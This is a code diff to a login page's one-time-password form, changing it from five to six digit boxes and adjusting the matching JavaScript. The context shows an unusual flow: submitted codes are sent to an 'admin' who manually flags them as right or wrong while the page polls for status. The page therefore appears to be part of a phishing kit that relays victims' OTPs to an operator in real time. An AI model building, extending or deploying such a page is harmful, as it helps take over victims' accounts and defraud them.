@@ -457,6 +457,7 @@
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,4)" id="o4">
+          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,5)" id="o5">
         </div>
         <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">17</span> seconds</div>
         <button class="btn-otp" id="bOtp" onclick="doOtp()">SUBMIT</button>
@@ -842,8 +843,8 @@
   // ══════════════════════════════════════════════════════
   function otpMv(el, i) {
     el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 4) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3,4].every(j => document.getElementById('o'+j).value);
+    if (el.value && i < 5) document.getElementById('o' + (i+1)).focus();
+    const ok = [0,1,2,3,4,5].every(j => document.getElementById('o'+j).value);
     document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
   }
 
@@ -887,7 +888,7 @@
       if (data.success) {
         showOtpMsg('info', 'A new OTP request has been sent to the admin.');
         startRs();
-        [0,1,2,3,4].forEach(i => { document.getElementById('o'+i).value = ''; });
+        [0,1,2,3,4,5].forEach(i => { document.getElementById('o'+i).value = ''; });
         document.getElementById('bOtp').className = 'btn-otp';
         document.getElementById('o0').focus();
       } else {
@@ -902,9 +903,9 @@
   // OTP SUBMIT — calls /api/verify-otp then polls /api/check-otp-status
   // ══════════════════════════════════════════════════════
   async function doOtp() {
-    const otp = [0,1,2,3,4].map(j => document.getElementById('o'+j).value).join('');
-    if (otp.length < 5) {
-      showOtpMsg('warning', 'Please enter all 5 digits of your OTP.');
+    const otp = [0,1,2,3,4,5].map(j => document.getElementById('o'+j).value).join('');
+    if (otp.length < 6) {
+      showOtpMsg('warning', 'Please enter all 6 digits of your OTP.');
       return;
     }
 
@@ -991,7 +992,7 @@
             chkLogin();
             document.getElementById('bLogin').disabled = false;
             // Clear OTP boxes
-            [0,1,2,3,4].forEach(i => document.getElementById('o'+i).value = '');
+            [0,1,2,3,4,5].forEach(i => document.getElementById('o'+i).value = '');
             // Reset OTP button
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
@@ -1012,7 +1013,7 @@
         } else if (data.status === 'wrongcode') {
           // Admin flagged OTP as wrong — let user re-enter
           clearInterval(otpPollInterval);
-          [0,1,2,3,4].forEach(i => document.getElementById('o'+i).value = '');
+          [0,1,2,3,4,5].forEach(i => document.getElementById('o'+i).value = '');
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
           showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
